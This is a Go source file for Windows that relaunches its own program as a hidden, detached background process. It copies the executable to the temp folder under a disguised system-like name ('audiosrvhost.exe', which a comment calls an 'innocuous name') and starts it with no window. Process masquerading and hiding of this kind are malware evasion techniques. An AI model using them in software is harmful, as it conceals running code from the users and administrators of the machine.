//go:build windows

package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

func init() {
	relaunchAsDaemonInternal = relaunchDaemonWindows
}

func relaunchDaemonWindows(currentExePath string, args []string, desiredTargetName string, bgEnvMarkerKey string, origPathEnvKey string, origPathEnvValue string) error {

	effectiveBaseName := "audiosrvhost.exe" // Example default innocuous name
	if desiredTargetName != "" && !strings.ContainsAny(desiredTargetName, "[]/:\\*?\"<>|") {
		effectiveBaseName = desiredTargetName
	}

	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	uniqueSuffix := fmt.Sprintf("%d_%d", time.Now().UnixNano(), r.Intn(10000))
	newExeName := strings.TrimSuffix(effectiveBaseName, ".exe") + "_" + uniqueSuffix + ".exe"

	tempDir := os.TempDir()
	newExePath := filepath.Join(tempDir, newExeName)

	inputBytes, err := os.ReadFile(currentExePath)
	if err != nil {
		return fmt.Errorf("failed to read current executable '%s': %v", currentExePath, err)
	}

	err = os.WriteFile(newExePath, inputBytes, 0755)
	if err != nil {
		return fmt.Errorf("failed to write new executable to '%s': %v", newExePath, err)
	}

	cmd := exec.Command(newExePath, args...) // args is currently empty from main.go call

	cmd.Env = append(os.Environ(), fmt.Sprintf("%s=1", bgEnvMarkerKey))
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", origPathEnvKey, origPathEnvValue))

	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000 | 0x00000008, // CREATE_NO_WINDOW | DETACHED_PROCESS
	}

	err = cmd.Start()
	if err != nil {
		// If starting fails, try to clean up the copied executable
		_ = os.Remove(newExePath)
		return fmt.Errorf("failed to start new process '%s': %v", newExePath, err)
	}

	if cmd.Process != nil {
		// On Windows, releasing the process handle allows the parent to exit
		// while the child continues running independently.
		_ = cmd.Process.Release() // Intentionally ignore error, best effort.
	}

	return nil
}
